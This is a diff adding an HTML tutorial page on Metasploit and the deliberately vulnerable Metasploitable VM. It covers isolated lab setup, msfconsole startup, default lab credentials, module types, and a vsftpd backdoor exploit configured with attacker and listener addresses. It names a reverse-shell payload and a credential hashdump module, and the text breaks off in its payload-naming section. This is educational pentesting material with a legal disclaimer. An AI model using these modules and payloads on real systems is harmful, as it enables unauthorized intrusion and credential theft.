@@ -1,0 +1,1511 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Metasploit & Metasploitable — Master Guide</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #080c0f;
+    --bg2: #0d1318;
+    --bg3: #111920;
+    --panel: #0a1520;
+    --border: #1a3040;
+    --border2: #0f4060;
+    --green: #00ff9d;
+    --green2: #00cc7a;
+    --green-dim: #00ff9d22;
+    --red: #ff3b5c;
+    --red-dim: #ff3b5c18;
+    --blue: #00b4ff;
+    --blue-dim: #00b4ff18;
+    --yellow: #ffd93d;
+    --yellow-dim: #ffd93d18;
+    --purple: #b44eff;
+    --text: #c8e0ec;
+    --text-dim: #5a7f96;
+    --text-bright: #e8f5ff;
+    --mono: 'Share Tech Mono', monospace;
+    --display: 'Orbitron', sans-serif;
+    --body: 'Rajdhani', sans-serif;
+    --scanline-opacity: 0.03;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--body);
+    font-size: 16px;
+    line-height: 1.6;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
+    pointer-events: none;
+    z-index: 1000;
+  }
+
+  /* HEADER */
+  header {
+    position: relative;
+    padding: 60px 40px 40px;
+    border-bottom: 1px solid var(--border2);
+    overflow: hidden;
+    background: linear-gradient(180deg, #020f1a 0%, var(--bg) 100%);
+  }
+
+  header::after {
+    content: '';
+    position: absolute;
+    bottom: -1px; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, var(--green), var(--blue), transparent);
+  }
+
+  .header-grid {
+    position: absolute;
+    inset: 0;
+    background-image: 
+      linear-gradient(rgba(0,180,255,0.04) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,180,255,0.04) 1px, transparent 1px);
+    background-size: 40px 40px;
+    mask-image: radial-gradient(ellipse at 50% 0%, black 30%, transparent 70%);
+  }
+
+  .header-content { position: relative; z-index: 2; max-width: 1200px; margin: 0 auto; }
+
+  .warning-badge {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: var(--red-dim); border: 1px solid var(--red);
+    color: var(--red); font-family: var(--mono); font-size: 11px;
+    padding: 4px 12px; margin-bottom: 20px;
+    letter-spacing: 2px;
+    animation: pulse-border 2s infinite;
+  }
+
+  @keyframes pulse-border {
+    0%, 100% { border-color: var(--red); box-shadow: 0 0 8px var(--red-dim); }
+    50% { border-color: #ff6b80; box-shadow: 0 0 16px rgba(255,59,92,0.3); }
+  }
+
+  .warning-dot { width: 6px; height: 6px; background: var(--red); border-radius: 50%; animation: blink 1s infinite; }
+  @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0; } }
+
+  h1 {
+    font-family: var(--display);
+    font-size: clamp(28px, 5vw, 52px);
+    font-weight: 900;
+    line-height: 1.1;
+    letter-spacing: 3px;
+    background: linear-gradient(135deg, var(--green) 0%, var(--blue) 60%, var(--purple) 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    margin-bottom: 8px;
+  }
+
+  .subtitle {
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+    margin-bottom: 30px;
+  }
+
+  .meta-tags { display: flex; gap: 10px; flex-wrap: wrap; }
+  .tag {
+    font-family: var(--mono); font-size: 11px; padding: 3px 10px;
+    border: 1px solid; letter-spacing: 1px;
+  }
+  .tag-green { border-color: var(--green); color: var(--green); background: var(--green-dim); }
+  .tag-blue { border-color: var(--blue); color: var(--blue); background: var(--blue-dim); }
+  .tag-yellow { border-color: var(--yellow); color: var(--yellow); background: var(--yellow-dim); }
+  .tag-red { border-color: var(--red); color: var(--red); background: var(--red-dim); }
+
+  /* NAV */
+  nav {
+    position: sticky; top: 0; z-index: 100;
+    background: rgba(8,12,15,0.95);
+    border-bottom: 1px solid var(--border);
+    backdrop-filter: blur(12px);
+    padding: 0 40px;
+    overflow-x: auto;
+  }
+
+  .nav-inner { display: flex; gap: 0; max-width: 1200px; margin: 0 auto; }
+
+  .nav-btn {
+    font-family: var(--mono); font-size: 11px; letter-spacing: 2px;
+    color: var(--text-dim); background: transparent;
+    border: none; border-bottom: 2px solid transparent;
+    padding: 14px 20px; cursor: pointer;
+    white-space: nowrap; transition: all 0.2s;
+  }
+  .nav-btn:hover { color: var(--text); }
+  .nav-btn.active { color: var(--green); border-bottom-color: var(--green); }
+
+  /* MAIN */
+  main { max-width: 1200px; margin: 0 auto; padding: 40px; }
+
+  .section { display: none; animation: fadeIn 0.3s ease; }
+  .section.active { display: block; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+  /* SECTION HEADER */
+  .section-header {
+    display: flex; align-items: center; gap: 16px;
+    margin-bottom: 32px; padding-bottom: 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-icon {
+    width: 48px; height: 48px; display: flex; align-items: center; justify-content: center;
+    font-size: 22px; border: 1px solid var(--border2); background: var(--bg3);
+    flex-shrink: 0;
+  }
+
+  .section-title {
+    font-family: var(--display); font-size: 22px; font-weight: 700;
+    color: var(--text-bright); letter-spacing: 2px;
+  }
+
+  .section-desc { font-size: 14px; color: var(--text-dim); margin-top: 2px; }
+
+  /* CARDS */
+  .grid { display: grid; gap: 20px; }
+  .grid-2 { grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); }
+  .grid-3 { grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); }
+
+  .card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    padding: 24px;
+    position: relative;
+    overflow: hidden;
+    transition: border-color 0.2s, transform 0.2s;
+  }
+  .card:hover { border-color: var(--border2); transform: translateY(-2px); }
+
+  .card::before {
+    content: '';
+    position: absolute; top: 0; left: 0; right: 0; height: 2px;
+    background: var(--accent, var(--green));
+    opacity: 0.6;
+  }
+
+  .card.red { --accent: var(--red); }
+  .card.blue { --accent: var(--blue); }
+  .card.yellow { --accent: var(--yellow); }
+  .card.purple { --accent: var(--purple); }
+
+  .card-num {
+    font-family: var(--display); font-size: 11px; color: var(--accent, var(--green));
+    letter-spacing: 3px; margin-bottom: 10px;
+  }
+
+  .card h3 {
+    font-family: var(--body); font-size: 17px; font-weight: 600;
+    color: var(--text-bright); margin-bottom: 10px;
+  }
+
+  .card p { font-size: 14px; color: var(--text-dim); line-height: 1.6; }
+
+  /* TERMINAL BLOCKS */
+  .terminal {
+    background: #050a0e;
+    border: 1px solid var(--border2);
+    margin: 16px 0;
+    overflow: hidden;
+  }
+
+  .terminal-bar {
+    background: #0a1520;
+    border-bottom: 1px solid var(--border);
+    padding: 8px 14px;
+    display: flex; align-items: center; gap: 8px;
+  }
+
+  .terminal-dots span {
+    display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 4px;
+  }
+  .dot-r { background: #ff5f57; }
+  .dot-y { background: #febc2e; }
+  .dot-g { background: #28c840; }
+
+  .terminal-title { font-family: var(--mono); font-size: 11px; color: var(--text-dim); letter-spacing: 1px; margin-left: 8px; }
+
+  .terminal-body {
+    padding: 18px 20px;
+    font-family: var(--mono);
+    font-size: 13px;
+    line-height: 1.8;
+    overflow-x: auto;
+  }
+
+  .prompt { color: var(--green); }
+  .cmd { color: #e8f0ff; }
+  .comment { color: #3a5a70; }
+  .output { color: var(--text-dim); }
+  .highlight { color: var(--yellow); }
+  .success { color: var(--green); }
+  .error-text { color: var(--red); }
+  .info { color: var(--blue); }
+  .module-name { color: var(--purple); }
+
+  /* PHASE TIMELINE */
+  .timeline { position: relative; padding-left: 30px; }
+  .timeline::before {
+    content: ''; position: absolute; left: 6px; top: 0; bottom: 0;
+    width: 1px; background: linear-gradient(180deg, var(--green), var(--blue), var(--purple));
+  }
+
+  .timeline-item { position: relative; margin-bottom: 28px; }
+  .timeline-dot {
+    position: absolute; left: -28px; top: 4px;
+    width: 14px; height: 14px; border-radius: 50%;
+    background: var(--green); border: 2px solid var(--bg);
+    box-shadow: 0 0 8px var(--green);
+  }
+  .timeline-dot.blue { background: var(--blue); box-shadow: 0 0 8px var(--blue); }
+  .timeline-dot.yellow { background: var(--yellow); box-shadow: 0 0 8px var(--yellow); }
+  .timeline-dot.red { background: var(--red); box-shadow: 0 0 8px var(--red); }
+  .timeline-dot.purple { background: var(--purple); box-shadow: 0 0 8px var(--purple); }
+
+  .timeline-title {
+    font-family: var(--body); font-size: 16px; font-weight: 600;
+    color: var(--text-bright); margin-bottom: 6px;
+  }
+
+  .timeline-text { font-size: 14px; color: var(--text-dim); }
+
+  /* INFO BOXES */
+  .info-box {
+    padding: 16px 20px; margin: 16px 0;
+    border-left: 3px solid; font-size: 14px;
+  }
+  .info-box.tip { border-color: var(--green); background: var(--green-dim); color: var(--green2); }
+  .info-box.warning { border-color: var(--yellow); background: var(--yellow-dim); color: #e8c840; }
+  .info-box.danger { border-color: var(--red); background: var(--red-dim); color: #ff6b80; }
+  .info-box.note { border-color: var(--blue); background: var(--blue-dim); color: var(--blue); }
+
+  .info-box strong { display: block; font-size: 11px; letter-spacing: 2px; margin-bottom: 4px; font-family: var(--mono); }
+
+  /* TABLE */
+  .data-table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 13px; margin: 16px 0; }
+  .data-table th {
+    background: var(--bg3); color: var(--green); font-weight: 400;
+    padding: 10px 16px; text-align: left; border: 1px solid var(--border);
+    letter-spacing: 2px; font-size: 11px;
+  }
+  .data-table td {
+    padding: 10px 16px; border: 1px solid var(--border);
+    color: var(--text); vertical-align: top;
+  }
+  .data-table tr:hover td { background: var(--bg3); }
+  .data-table .port { color: var(--yellow); }
+  .data-table .service { color: var(--blue); }
+  .data-table .vuln { color: var(--red); }
+  .data-table .module { color: var(--purple); }
+
+  /* STEPS */
+  .steps { counter-reset: step; }
+  .step {
+    counter-increment: step;
+    display: grid;
+    grid-template-columns: 40px 1fr;
+    gap: 16px; margin-bottom: 24px; align-items: start;
+  }
+  .step-num {
+    width: 40px; height: 40px;
+    background: var(--green-dim); border: 1px solid var(--green);
+    color: var(--green); font-family: var(--mono); font-size: 14px;
+    display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+  }
+  .step-num::before { content: counter(step, decimal-leading-zero); }
+  .step-content h4 { font-size: 15px; font-weight: 600; color: var(--text-bright); margin-bottom: 6px; }
+  .step-content p { font-size: 14px; color: var(--text-dim); }
+
+  /* MODULE ANATOMY */
+  .module-diagram {
+    border: 1px solid var(--border2); background: var(--panel); padding: 24px; margin: 16px 0;
+  }
+
+  .module-row { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; flex-wrap: wrap; }
+  .module-label {
+    font-family: var(--mono); font-size: 11px; letter-spacing: 1px;
+    color: var(--text-dim); min-width: 110px;
+  }
+  .module-value {
+    font-family: var(--mono); font-size: 13px; color: var(--text);
+    background: var(--bg); border: 1px solid var(--border); padding: 4px 12px;
+  }
+  .module-value.green { color: var(--green); border-color: var(--green2); }
+  .module-value.red { color: var(--red); border-color: var(--red); }
+  .module-value.blue { color: var(--blue); border-color: var(--blue); }
+  .module-value.yellow { color: var(--yellow); border-color: var(--yellow); }
+
+  /* PROGRESS INDICATOR */
+  .progress-track { margin-bottom: 40px; }
+  .progress-label { display: flex; justify-content: space-between; margin-bottom: 6px; }
+  .progress-label span { font-family: var(--mono); font-size: 11px; color: var(--text-dim); letter-spacing: 1px; }
+  .progress-bar { height: 3px; background: var(--border); position: relative; overflow: hidden; }
+  .progress-fill { height: 100%; background: linear-gradient(90deg, var(--green), var(--blue)); transition: width 0.5s ease; }
+
+  /* EXPLOIT TABLE */
+  .exploit-card {
+    border: 1px solid var(--border); margin-bottom: 12px; overflow: hidden;
+  }
+  .exploit-header {
+    background: var(--bg3); padding: 12px 16px;
+    display: flex; align-items: center; gap: 12px; cursor: pointer;
+    transition: background 0.2s;
+  }
+  .exploit-header:hover { background: var(--bg2); }
+  .exploit-rank {
+    font-family: var(--mono); font-size: 10px; padding: 2px 8px;
+    border: 1px solid; letter-spacing: 1px;
+  }
+  .rank-excellent { border-color: var(--green); color: var(--green); }
+  .rank-great { border-color: var(--blue); color: var(--blue); }
+  .rank-good { border-color: var(--yellow); color: var(--yellow); }
+  .rank-normal { border-color: var(--text-dim); color: var(--text-dim); }
+
+  .exploit-name { font-family: var(--mono); font-size: 13px; color: var(--text); flex: 1; }
+  .exploit-cve { font-family: var(--mono); font-size: 11px; color: var(--red); margin-left: auto; }
+  .exploit-body { padding: 16px; border-top: 1px solid var(--border); background: var(--panel); display: none; }
+  .exploit-body.open { display: block; }
+  .exploit-body p { font-size: 14px; color: var(--text-dim); margin-bottom: 12px; }
+
+  /* CHEATSHEET */
+  .cheat-section { margin-bottom: 32px; }
+  .cheat-title {
+    font-family: var(--mono); font-size: 12px; letter-spacing: 3px;
+    color: var(--green); border-bottom: 1px solid var(--border);
+    padding-bottom: 8px; margin-bottom: 14px;
+  }
+  .cheat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+  .cheat-item {
+    display: flex; align-items: flex-start; gap: 12px;
+    background: var(--bg3); border: 1px solid var(--border);
+    padding: 10px 14px;
+  }
+  .cheat-cmd { font-family: var(--mono); font-size: 12px; color: var(--yellow); min-width: 180px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .cheat-desc { font-size: 13px; color: var(--text-dim); }
+
+  /* FOOTER */
+  footer {
+    margin-top: 80px; padding: 30px 40px;
+    border-top: 1px solid var(--border);
+    text-align: center;
+    font-family: var(--mono); font-size: 11px; color: var(--text-dim); letter-spacing: 1px;
+  }
+
+  /* RESPONSIVE */
+  @media (max-width: 700px) {
+    header { padding: 40px 20px 30px; }
+    main { padding: 24px 20px; }
+    nav { padding: 0 16px; }
+    .cheat-grid { grid-template-columns: 1fr; }
+    .grid-2, .grid-3 { grid-template-columns: 1fr; }
+  }
+
+  /* Typing animation for header */
+  .typing { overflow: hidden; white-space: nowrap; border-right: 2px solid var(--green); animation: typing 3s steps(50,end) forwards, cursor-blink 0.8s step-end infinite; width: 0; }
+  @keyframes typing { to { width: 100%; } }
+  @keyframes cursor-blink { 0%,100% { border-color: var(--green); } 50% { border-color: transparent; } }
+
+  li { color: var(--text-dim); font-size: 14px; margin-bottom: 6px; padding-left: 4px; }
+  ul { padding-left: 20px; margin: 8px 0; }
+  li::marker { color: var(--green); }
+
+  h2 { font-family: var(--body); font-size: 18px; font-weight: 600; color: var(--text-bright); margin: 24px 0 12px; }
+  p { font-size: 15px; color: var(--text-dim); margin-bottom: 10px; }
+
+  .spacer { height: 24px; }
+
+  .badge-row { display: flex; gap: 8px; flex-wrap: wrap; margin: 12px 0; }
+  .badge {
+    font-family: var(--mono); font-size: 10px; padding: 3px 10px;
+    letter-spacing: 1px; border: 1px solid;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-grid"></div>
+  <div class="header-content">
+    <div class="warning-badge">
+      <div class="warning-dot"></div>
+      FOR AUTHORIZED PENETRATION TESTING ONLY — ETHICAL USE REQUIRED
+    </div>
+    <h1>METASPLOIT<br>MASTERY GUIDE</h1>
+    <p class="subtitle">// COMPREHENSIVE EXPLOITATION FRAMEWORK REFERENCE & LAB MANUAL</p>
+    <div class="meta-tags">
+      <span class="tag tag-green">METASPLOIT 6.x</span>
+      <span class="tag tag-blue">METASPLOITABLE 2/3</span>
+      <span class="tag tag-yellow">KALI LINUX</span>
+      <span class="tag tag-red">OFFENSIVE SECURITY</span>
+    </div>
+  </div>
+</header>
+
+<nav>
+  <div class="nav-inner">
+    <button class="nav-btn active" onclick="showSection('overview', this)">01 OVERVIEW</button>
+    <button class="nav-btn" onclick="showSection('setup', this)">02 LAB SETUP</button>
+    <button class="nav-btn" onclick="showSection('architecture', this)">03 ARCHITECTURE</button>
+    <button class="nav-btn" onclick="showSection('commands', this)">04 CORE COMMANDS</button>
+    <button class="nav-btn" onclick="showSection('scanning', this)">05 SCANNING</button>
+    <button class="nav-btn" onclick="showSection('exploits', this)">06 EXPLOITATION</button>
+    <button class="nav-btn" onclick="showSection('meterpreter', this)">07 METERPRETER</button>
+    <button class="nav-btn" onclick="showSection('postexploit', this)">08 POST-EXPLOIT</button>
+    <button class="nav-btn" onclick="showSection('cheatsheet', this)">09 CHEAT SHEET</button>
+  </div>
+</nav>
+
+<main>
+
+  <!-- ─── SECTION 1: OVERVIEW ─── -->
+  <section id="overview" class="section active">
+    <div class="section-header">
+      <div class="section-icon">⚡</div>
+      <div>
+        <div class="section-title">FRAMEWORK OVERVIEW</div>
+        <div class="section-desc">What is Metasploit — history, purpose, ecosystem</div>
+      </div>
+    </div>
+
+    <div class="info-box danger">
+      <strong>⚠ LEGAL DISCLAIMER</strong>
+      This guide is for educational purposes and authorized penetration testing ONLY. Never use these techniques on systems you do not own or have explicit written permission to test. Unauthorized access is illegal under the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide.
+    </div>
+
+    <div class="grid grid-2">
+      <div class="card">
+        <div class="card-num">01 — WHAT IS IT</div>
+        <h3>Metasploit Framework</h3>
+        <p>An open-source penetration testing framework developed by HD Moore in 2003, now maintained by Rapid7. It is the world's most widely used exploitation framework — a complete platform for developing, testing, and executing exploits against target machines.</p>
+      </div>
+      <div class="card blue">
+        <div class="card-num">02 — TARGET</div>
+        <h3>Metasploitable</h3>
+        <p>An intentionally vulnerable Linux VM created by Rapid7 for practicing Metasploit. Metasploitable 2 is the classic version with dozens of known vulnerabilities. Metasploitable 3 adds Windows and more complex scenarios. It is the perfect safe sandbox for learning.</p>
+      </div>
+      <div class="card yellow">
+        <div class="card-num">03 — EDITIONS</div>
+        <h3>Framework vs Pro</h3>
+        <p><strong>Metasploit Framework:</strong> Free, CLI-based, full-featured. Used via <code>msfconsole</code>.<br><strong>Metasploit Pro:</strong> Commercial, adds GUI (Armitage-style), automated scans, reporting, campaign tracking. Mostly used in enterprise.</p>
+      </div>
+      <div class="card red">
+        <div class="card-num">04 — ETHICS</div>
+        <h3>Responsible Use</h3>
+        <p>Always operate within a defined scope. Obtain written authorization. Document all findings. Use a sandboxed lab environment (VirtualBox/VMware) completely isolated from production networks. Follow PTES (Penetration Testing Execution Standard).</p>
+      </div>
+    </div>
+
+    <div class="spacer"></div>
+    <h2>Penetration Testing Lifecycle</h2>
+    <div class="timeline">
+      <div class="timeline-item">
+        <div class="timeline-dot"></div>
+        <div class="timeline-title">1. Reconnaissance</div>
+        <div class="timeline-text">Passive & active information gathering. OSINT, DNS enumeration, WHOIS. In MSF: <code>auxiliary/scanner/*</code> modules, db_nmap integration.</div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-dot blue"></div>
+        <div class="timeline-title">2. Scanning & Enumeration</div>
+        <div class="timeline-text">Port scanning, service version detection, OS fingerprinting. Identify open ports, running services, and potential attack surfaces using Nmap and MSF auxiliary scanners.</div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-dot yellow"></div>
+        <div class="timeline-title">3. Vulnerability Analysis</div>
+        <div class="timeline-text">Match discovered services against known CVEs. Use <code>vulns</code> database, search MSF modules, cross-reference NVD/Exploit-DB.</div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-dot red"></div>
+        <div class="timeline-title">4. Exploitation</div>
+        <div class="timeline-text">Execute the attack. Select exploit module, configure payload, set targets, run the exploit. Gain initial access. This is where MSF shines with 2,300+ modules.</div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-dot purple"></div>
+        <div class="timeline-title">5. Post-Exploitation</div>
+        <div class="timeline-text">Privilege escalation, lateral movement, credential harvesting, persistence. Use Meterpreter scripts, post/ modules, and pivoting to reach deeper network segments.</div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-dot"></div>
+        <div class="timeline-title">6. Reporting</div>
+        <div class="timeline-text">Document all findings, screenshots, paths taken, and remediation recommendations. MSF Pro has built-in report generation. Framework users export from the database.</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ─── SECTION 2: SETUP ─── -->
+  <section id="setup" class="section">
+    <div class="section-header">
+      <div class="section-icon">🖥</div>
+      <div>
+        <div class="section-title">LAB ENVIRONMENT SETUP</div>
+        <div class="section-desc">Configure your isolated hacking lab from scratch</div>
+      </div>
+    </div>
+
+    <div class="info-box tip">
+      <strong>✓ RECOMMENDED SETUP</strong>
+      Use VirtualBox or VMware with a host-only or NAT network adapter. Keep the lab 100% isolated from your real network. Kali Linux (attacker) + Metasploitable 2 (target) is the classic combination.
+    </div>
+
+    <h2>Required Downloads</h2>
+    <div class="grid grid-3">
+      <div class="card">
+        <div class="card-num">ATTACKER</div>
+        <h3>Kali Linux</h3>
+        <p>Ships with Metasploit pre-installed. Download from <strong>kali.org/get-kali</strong>. Use the VirtualBox/VMware image for convenience.</p>
+      </div>
+      <div class="card blue">
+        <div class="card-num">TARGET</div>
+        <h3>Metasploitable 2</h3>
+        <p>Download from <strong>sourceforge.net/projects/metasploitable</strong>. Unzip and import the VMDK as a virtual machine.</p>
+      </div>
+      <div class="card yellow">
+        <div class="card-num">HYPERVISOR</div>
+        <h3>VirtualBox</h3>
+        <p>Free and open-source. Download from <strong>virtualbox.org</strong>. Create a host-only adapter to let VMs talk without external internet.</p>
+      </div>
+    </div>
+
+    <div class="spacer"></div>
+    <h2>Network Configuration</h2>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div>
+        <span class="terminal-title">VirtualBox Network Setup</span>
+      </div>
+      <div class="terminal-body">
+<span class="comment"># Step 1: In VirtualBox — File → Host Network Manager</span>
+<span class="comment"># Create a new Host-Only Adapter (e.g. vboxnet0)</span>
+<span class="comment"># Set IPv4: 192.168.56.1 / 255.255.255.0</span>
+<span class="comment"># Disable DHCP (assign IPs manually)</span>
+
+<span class="comment"># Step 2: For KALI VM — Settings → Network</span>
+<span class="comment"># Adapter 1: NAT (internet access for updates)</span>
+<span class="comment"># Adapter 2: Host-Only Adapter → vboxnet0</span>
+
+<span class="comment"># Step 3: For METASPLOITABLE VM — Settings → Network</span>
+<span class="comment"># Adapter 1: Host-Only Adapter → vboxnet0</span>
+<span class="comment"># (NO NAT — keep it isolated)</span>
+
+<span class="comment"># Step 4: Verify connectivity from Kali</span>
+<span class="prompt">┌──(kali㉿kali)-[~]</span>
+<span class="prompt">└─$</span> <span class="cmd">ip addr show eth1</span>
+<span class="output">inet 192.168.56.101/24</span>
+
+<span class="prompt">└─$</span> <span class="cmd">ping 192.168.56.102</span>
+<span class="success">PING 192.168.56.102: 64 bytes from 192.168.56.102 — ttl=64</span>
+      </div>
+    </div>
+
+    <h2>Starting Metasploit</h2>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div>
+        <span class="terminal-title">Kali Linux — Initial Metasploit Setup</span>
+      </div>
+      <div class="terminal-body">
+<span class="comment"># Start PostgreSQL database (required for workspace/hosts/vulns)</span>
+<span class="prompt">└─$</span> <span class="cmd">sudo systemctl start postgresql</span>
+<span class="prompt">└─$</span> <span class="cmd">sudo systemctl enable postgresql</span>
+
+<span class="comment"># Initialize MSF database (first time only)</span>
+<span class="prompt">└─$</span> <span class="cmd">sudo msfdb init</span>
+<span class="success">[+] Starting database</span>
+<span class="success">[+] Creating database user 'msf'</span>
+<span class="success">[+] Creating databases 'msf' and 'msf_test'</span>
+<span class="success">[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'</span>
+
+<span class="comment"># Launch the Metasploit console</span>
+<span class="prompt">└─$</span> <span class="cmd">msfconsole</span>
+
+<span class="output">       =[ metasploit v6.x.x-dev                          ]</span>
+<span class="output">+ -- --=[ 2300+ exploits - 1200+ auxiliary - 400+ post   ]</span>
+<span class="output">+ -- --=[ 945 payloads - 46 encoders - 11 nops            ]</span>
+
+<span class="comment"># Verify database connection</span>
+<span class="prompt">msf6 &gt;</span> <span class="cmd">db_status</span>
+<span class="success">[*] Connected to msf. Connection type: postgresql.</span>
+      </div>
+    </div>
+
+    <h2>Metasploitable 2 — Default Credentials</h2>
+    <table class="data-table">
+      <tr><th>SERVICE</th><th>USERNAME</th><th>PASSWORD</th><th>NOTE</th></tr>
+      <tr><td class="service">SSH / System</td><td>msfadmin</td><td>msfadmin</td><td>Default login</td></tr>
+      <tr><td class="service">MySQL</td><td>root</td><td>(empty)</td><td>No password set</td></tr>
+      <tr><td class="service">PostgreSQL</td><td>postgres</td><td>postgres</td><td>Default</td></tr>
+      <tr><td class="service">Tomcat</td><td>tomcat</td><td>tomcat</td><td>Manager UI at :8180</td></tr>
+      <tr><td class="service">phpMyAdmin</td><td>root</td><td>(empty)</td><td>At /phpmyadmin</td></tr>
+      <tr><td class="service">Samba</td><td>msfadmin</td><td>msfadmin</td><td>SMB shares</td></tr>
+    </table>
+  </section>
+
+  <!-- ─── SECTION 3: ARCHITECTURE ─── -->
+  <section id="architecture" class="section">
+    <div class="section-header">
+      <div class="section-icon">🏗</div>
+      <div>
+        <div class="section-title">FRAMEWORK ARCHITECTURE</div>
+        <div class="section-desc">Module types, payloads, encoders, listeners — the internals</div>
+      </div>
+    </div>
+
+    <h2>Module Types</h2>
+    <div class="grid grid-2">
+      <div class="card red">
+        <div class="card-num">TYPE — EXPLOIT</div>
+        <h3>Exploit Modules</h3>
+        <p>Active modules that take advantage of a specific vulnerability in a target system. They deliver a payload upon successful execution. Located at <code>modules/exploits/</code>. Examples: EternalBlue, vsftpd backdoor.</p>
+        <div class="terminal" style="margin-top:12px">
+          <div class="terminal-body" style="padding:10px 14px;font-size:12px">
+            <span class="module-name">exploit/multi/handler</span><br>
+            <span class="module-name">exploit/unix/ftp/vsftpd_234_backdoor</span><br>
+            <span class="module-name">exploit/windows/smb/ms17_010_eternalblue</span>
+          </div>
+        </div>
+      </div>
+      <div class="card blue">
+        <div class="card-num">TYPE — AUXILIARY</div>
+        <h3>Auxiliary Modules</h3>
+        <p>Scanning, fuzzing, brute-forcing, and information gathering tools that do NOT deliver payloads. Essential for enumeration and discovery phases.</p>
+        <div class="terminal" style="margin-top:12px">
+          <div class="terminal-body" style="padding:10px 14px;font-size:12px">
+            <span class="module-name">auxiliary/scanner/portscan/tcp</span><br>
+            <span class="module-name">auxiliary/scanner/smb/smb_version</span><br>
+            <span class="module-name">auxiliary/scanner/ssh/ssh_login</span>
+          </div>
+        </div>
+      </div>
+      <div class="card yellow">
+        <div class="card-num">TYPE — PAYLOAD</div>
+        <h3>Payload Modules</h3>
+        <p>Code that runs on the target after exploitation. Three subtypes: <strong>Singles</strong> (self-contained), <strong>Stagers</strong> (setup connection), <strong>Stages</strong> (large feature-rich code pulled by stager). Meterpreter is the most powerful staged payload.</p>
+      </div>
+      <div class="card">
+        <div class="card-num">TYPE — POST</div>
+        <h3>Post-Exploitation Modules</h3>
+        <p>Run after gaining a session. Gather credentials, escalate privileges, pivot networks, establish persistence, extract sensitive files. Over 300 modules available.</p>
+        <div class="terminal" style="margin-top:12px">
+          <div class="terminal-body" style="padding:10px 14px;font-size:12px">
+            <span class="module-name">post/multi/recon/local_exploit_suggester</span><br>
+            <span class="module-name">post/linux/gather/hashdump</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="spacer"></div>
+    <h2>Module Anatomy — Exploit Configuration</h2>
+    <div class="module-diagram">
+      <div class="module-row">
+        <span class="module-label">MODULE PATH</span>
+        <span class="module-value green">exploit/unix/ftp/vsftpd_234_backdoor</span>
+      </div>
+      <div class="module-row">
+        <span class="module-label">RANK</span>
+        <span class="module-value yellow">EXCELLENT</span>
+        <span style="font-size:12px;color:var(--text-dim)">↑ Higher = more reliable</span>
+      </div>
+      <div class="module-row">
+        <span class="module-label">RHOSTS</span>
+        <span class="module-value blue">192.168.56.102</span>
+        <span style="font-size:12px;color:var(--text-dim)">Target IP / range</span>
+      </div>
+      <div class="module-row">
+        <span class="module-label">RPORT</span>
+        <span class="module-value">21</span>
+        <span style="font-size:12px;color:var(--text-dim)">Target port</span>
+      </div>
+      <div class="module-row">
+        <span class="module-label">LHOST</span>
+        <span class="module-value blue">192.168.56.101</span>
+        <span style="font-size:12px;color:var(--text-dim)">Your (attacker) IP</span>
+      </div>
+      <div class="module-row">
+        <span class="module-label">LPORT</span>
+        <span class="module-value">4444</span>
+        <span style="font-size:12px;color:var(--text-dim)">Your listener port</span>
+      </div>
+      <div class="module-row">
+        <span class="module-label">PAYLOAD</span>
+        <span class="module-value red">cmd/unix/interact</span>
+        <span style="font-size:12px;color:var(--text-dim)">Code to run on target</span>
+      </div>
+      <div class="module-row">
+        <span class="module-label">TARGET</span>
+        <span class="module-value">0 (Automatic)</span>
+      </div>
+    </div>
+
+    <h2>Payload Naming Convention</h2>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="terminal-dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div>
+        <span class="terminal-title">Payload Structure</span>
+      </div>
+      <div class="terminal-body">
+<span class="comment"># Format: &lt;platform&gt;/&lt;architecture&gt;/&lt;type&gt;</span>
+
+<span class="highlight">linux</span>/<span class="info">x86</span>/<span class="success">shell_reverse_tcp</span>
+<span class="comment">#   ↑           ↑          ↑</span>
